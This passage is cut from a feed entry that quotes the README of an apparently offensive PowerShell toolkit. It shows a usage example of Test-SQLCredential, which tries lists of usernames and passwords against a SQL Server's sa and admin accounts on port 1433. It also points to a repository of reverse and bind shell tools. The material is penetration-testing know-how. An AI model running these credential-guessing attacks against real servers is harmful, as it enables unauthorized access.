tests the 3 defined passwords against the admin and sa account on the SQL server located on sql.domain.com over port 1433, waiting 60 seconds in between failed attempts&#xA;&#xA;Test-SQLCredential -Server sql.domian.com -Username (Get-Content -Path C:\Temp\userlist.txt) -Passwd (Get-Content -Path C:\Temp\passlist.txt)&#xA;# This example tests the passwords in C:\Temp\passlist.txt against all users defined in C:\Temp\userlist.txt file against the SQL server located at sql.domain.com over port 1433, waiting 1 seconds in between failed attempts&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For more information on Start-Listener, Start-Bind, and Invoke-ReversePowerShell see &lt;a href=&#34;https://github.com/tobor88/ReversePowerShell&#34;&gt;https://github.com/tobor88/ReversePowerShell&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
</feed>